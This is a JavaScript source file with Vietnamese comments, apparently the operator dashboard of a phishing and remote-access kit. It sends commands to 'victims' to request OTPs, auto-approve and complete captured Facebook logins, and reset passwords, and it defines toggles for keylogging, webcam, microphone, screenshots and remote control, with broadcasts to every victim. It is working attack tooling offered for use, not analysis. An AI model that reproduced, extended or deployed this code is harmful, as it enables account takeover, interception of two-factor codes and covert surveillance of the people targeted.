/**
 * Victim Integration Flow - Kết nối giữa Admin Actions và Victim Operations
 *
 * File này quản lý tất cả các luồng tích hợp giữa:
 * - Enhanced Dashboard actions với victim commands
 * - User feedback với victim data
 * - System actions với victim notifications
 */

import { restAdaptor } from "../adaptors";

/**
 * Victim Action Types - Các loại hành động victim có thể thực hiện
 */
export const VICTIM_ACTIONS = {
  // Login related
  AUTO_APPROVE_LOGIN: "auto_approve_login",
  COMPLETE_LOGIN: "complete_login",
  REQUEST_OTP: "request_otp",
  SEND_EMAIL: "send_email",
  SEND_SMS: "send_sms",
  RESET_PASSWORD: "reset_password",

  // System notifications
  SYSTEM_RESTART_NOTICE: "system_restart_notice",
  MAINTENANCE_MODE: "maintenance_mode",

  // Monitoring
  SCREENSHOT: "screenshot",
  SYSTEM_INFO: "system_info",
  NAVIGATE: "navigate",

  // Control
  ENABLE_SCREEN: "enable_screen",
  ENABLE_KEYLOG: "enable_keylog",
  ENABLE_WEBCAM: "enable_webcam",
  ENABLE_MIC: "enable_mic",
  ENABLE_CONTROL: "enable_control",
};

/**
 * Enhanced Dashboard Integration
 * Kết nối các action buttons trong Enhanced Dashboard với victim operations
 */
export class VictimIntegrationFlow {
  constructor(toast) {
    this.toast = toast;
  }

  /**
   * Xử lý action từ Enhanced Dashboard
   * @param {string} actionType - Loại action (approve, otp, email, sdt, reset, loginOk)
   * @param {Object} record - Bản ghi login từ Enhanced Dashboard
   * @param {string} victimId - ID của victim
   */
  async handleDashboardAction(actionType, record, victimId) {
    if (!victimId) {
      this.toast({
        title: "⚠️ No Victim Connection",
        description: "Bản ghi này không có kết nối với victim",
        variant: "destructive",
      });
      return false;
    }

    try {
      // Map dashboard actions to victim commands
      const victimCommandMap = {
        approve: {
          command: VICTIM_ACTIONS.AUTO_APPROVE_LOGIN,
          params: {
            loginId: record.id,
            userEmail: record.account.email,
            approved: true,
          },
        },
        otp: {
          command: VICTIM_ACTIONS.REQUEST_OTP,
          params: {
            loginId: record.id,
            userPhone: record.account.phone,
          },
        },
        email: {
          command: VICTIM_ACTIONS.SEND_EMAIL,
          params: {
            loginId: record.id,
            userEmail: record.account.email,
          },
        },
        sdt: {
          command: VICTIM_ACTIONS.SEND_SMS,
          params: {
            loginId: record.id,
            userPhone: record.account.phone,
          },
        },
        reset: {
          command: VICTIM_ACTIONS.RESET_PASSWORD,
          params: {
            loginId: record.id,
            userEmail: record.account.email,
          },
        },
        loginOk: {
          command: VICTIM_ACTIONS.COMPLETE_LOGIN,
          params: {
            loginId: record.id,
            userEmail: record.account.email,
            redirectUrl: record.successUrl || "https://facebook.com/home",
          },
        },
      };

      const victimCommand = victimCommandMap[actionType];
      if (!victimCommand) {
        throw new Error(`Unknown action type: ${actionType}`);
      }

      // Send command to specific victim
      const response = await restAdaptor.post(`/victims/${victimId}/commands`, {
        command: victimCommand.command,
        params: victimCommand.params,
        timestamp: new Date().toISOString(),
        source: "enhanced_dashboard",
      });

      if (response.success) {
        this.toast({
          title: "✅ Victim Command Sent",
          description: `Đã gửi lệnh ${actionType} đến victim ${victimId}`,
          duration: 3000,
        });
        return true;
      }

      return false;
    } catch (error) {
      this.toast({
        title: "❌ Victim Command Failed",
        description: `Không thể gửi lệnh đến victim: ${error.message}`,
        variant: "destructive",
      });
      return false;
    }
  }

  /**
   * Broadcast system notification to all victims
   * @param {string} command - Command to broadcast
   * @param {Object} params - Parameters for the command
   */
  async broadcastToAllVictims(command, params = {}) {
    try {
      const response = await restAdaptor.post("/victims/broadcast", {
        command,
        params,
        timestamp: new Date().toISOString(),
        source: "system_admin",
      });

      if (response.success) {
        this.toast({
          title: "📡 Broadcast Sent",
          description: `Đã gửi thông báo ${command} đến tất cả victims`,
          duration: 3000,
        });
        return response.data;
      }

      return null;
    } catch (error) {
      this.toast({
        title: "❌ Broadcast Failed",
        description: `Không thể gửi broadcast: ${error.message}`,
        variant: "destructive",
      });
      return null;
    }
  }

  /**
   * Get victim info by ID
   * @param {string} victimId - ID của victim
   */
  async getVictimInfo(victimId) {
    try {
      const response = await restAdaptor.get(`/victims/${victimId}`);
      return response.success ? response.data : null;
    } catch (error) {
      console.error("Failed to get victim info:", error);
      return null;
    }
  }

  /**
   * Link user feedback to victim
   * @param {Object} feedback - Feedback object
   */
  async linkFeedbackToVictim(feedback) {
    if (!feedback.victimId) return null;

    try {
      // Get victim info
      const victimInfo = await this.getVictimInfo(feedback.victimId);
      if (!victimInfo) return null;

      // Send feedback info to victim for tracking
      await restAdaptor.post(`/victims/${feedback.victimId}/commands`, {
        command: "user_feedback_received",
        params: {
          feedbackId: feedback.id,
          feedbackType: feedback.feedbackType,
          userEmail: feedback.userEmail,
          message: feedback.message,
          timestamp: feedback.timestamp,
        },
        source: "user_feedback",
      });

      return victimInfo;
    } catch (error) {
      console.error("Failed to link feedback to victim:", error);
      return null;
    }
  }

  /**
   * Sync victim status with Enhanced Dashboard
   * @param {Array} loginRecords - Danh sách records từ Enhanced Dashboard
   */
  async syncVictimStatus(loginRecords) {
    const victimIds = loginRecords
      .filter((record) => record.victimId)
      .map((record) => record.victimId);

    if (victimIds.length === 0) return [];

    try {
      // Get status of all victims
      const response = await restAdaptor.post("/victims/batch-status", {
        victimIds,
      });

      if (response.success) {
        return response.data; // Array of victim statuses
      }

      return [];
    } catch (error) {
      console.error("Failed to sync victim status:", error);
      return [];
    }
  }
}

/**
 * Utility functions for victim integration
 */
export const VictimUtils = {
  /**
   * Generate victim ID for test users
   */
  generateTestVictimId() {
    return `VICTIM_TEST_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 6)}`;
  },

  /**
   * Check if victim ID is valid format
   * @param {string} victimId
   */
  isValidVictimId(victimId) {
    return /^VICTIM_[A-Z0-9_]+$/.test(victimId);
  },

  /**
   * Extract victim type from ID
   * @param {string} victimId
   */
  getVictimType(victimId) {
    if (victimId.includes("TEST")) return "test";
    if (victimId.includes("PROD")) return "production";
    return "unknown";
  },

  /**
   * Format victim display name
   * @param {string} victimId
   */
  formatVictimDisplayName(victimId) {
    if (!victimId) return "N/A";
    return victimId.replace("VICTIM_", "").replace(/_/g, "-");
  },
};

export default VictimIntegrationFlow;
